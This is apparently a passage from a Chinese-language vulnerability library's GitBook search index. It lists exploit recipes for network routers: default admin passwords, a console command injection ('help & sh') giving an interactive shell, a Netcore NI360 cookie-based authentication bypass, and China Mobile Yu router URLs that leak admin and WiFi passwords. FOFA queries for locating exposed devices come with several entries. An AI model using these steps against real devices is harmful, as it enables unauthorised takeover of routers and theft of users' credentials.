登录页面如下 默认密码为 adimn/admin or admin123 漏洞存在于 命令控制台中，其中存在命令注入 可以使用 help & sh 得到交互式命令写入恶意文件 稻草人安全漏洞库 all right reserved，powered by Gitbook文件更新时间： 2021-07-21 13:48:08 "},"book/网络设备漏洞/磊科/":{"url":"book/网络设备漏洞/磊科/","title":"磊科","keywords":"","body":"稻草人安全漏洞库 all right reserved，powered by Gitbook文件更新时间： 2021-07-21 13:48:08 "},"book/网络设备漏洞/磊科/磊科 NI360路由器 认证绕过漏洞.html":{"url":"book/网络设备漏洞/磊科/磊科 NI360路由器 认证绕过漏洞.html","title":"磊科 NI360路由器 认证绕过漏洞","keywords":"","body":"磊科 NI360路由器 认证绕过漏洞 漏洞描述 磊科 NI360路由器 存在认证绕过漏洞，通过添加特定的Cookie字段获取后台权限 漏洞影响 磊科 NI360路由器 FOFA [!NOTE] title=\"Netcore\" 漏洞描述 登录页面如下 添加 Cookie字段 : netcore_login=guest:1 刷新后登录后台 稻草人安全漏洞库 all right reserved，powered by Gitbook文件更新时间： 2021-07-21 13:48:08 "},"book/网络设备漏洞/中国移动/":{"url":"book/网络设备漏洞/中国移动/","title":"中国移动","keywords":"","body":"中国移动 中国移动 禹路由 simple-index.asp 越权访问漏洞 稻草人安全漏洞库 all right reserved，powered by Gitbook文件更新时间： 2021-07-21 13:48:08 "},"book/网络设备漏洞/中国移动/中国移动 禹路由 ExportSettings.sh 敏感信息泄露漏洞.html":{"url":"book/网络设备漏洞/中国移动/中国移动 禹路由 ExportSettings.sh 敏感信息泄露漏洞.html","title":"中国移动 禹路由 ExportSettings.sh 敏感信息泄露漏洞","keywords":"","body":"中国移动 禹路由 ExportSettings.sh 敏感信息泄露漏洞 漏洞描述 中国移动 禹路由 ExportSettings.sh 存在敏感信息泄露漏洞，攻击者通过漏洞获取配置文件，其中包含账号密码等敏感信息 漏洞影响 [!NOTE] 中国移动 禹路由 FOFA [!NOTE] title=\"互联世界 物联未来-登录\" 漏洞复现 登录页面如下 访问Url /cgi-bin/ExportSettings.sh 其中password为登录后台密码 稻草人安全漏洞库 all right reserved，powered by Gitbook文件更新时间： 2021-07-21 13:48:08 "},"book/网络设备漏洞/中国移动/中国移动 禹路由 simple-index.asp 越权访问漏洞.html":{"url":"book/网络设备漏洞/中国移动/中国移动 禹路由 simple-index.asp 越权访问漏洞.html","title":"中国移动 禹路由 simple-index.asp 越权访问漏洞","keywords":"","body":"中国移动 禹路由 simple-index.asp 越权访问漏洞 漏洞描述 中国移动 禹路由 simple-index.asp 存在越权访问漏洞，攻击者通过漏洞可以获取账号密码等敏感信息 漏洞影响 [!NOTE] 中国移动 禹路由 FOFA [!NOTE] title=\"互联世界 物联未来-登录\" 漏洞复现 登录页面如下 访问Url /simple-index.asp ​ 越过管理员验证获取Wifl账号密码等信息 稻草人安全漏洞库 all right reserved，powered by Gitbook文件更新时间： 2021-07-21 13:48:08 "}}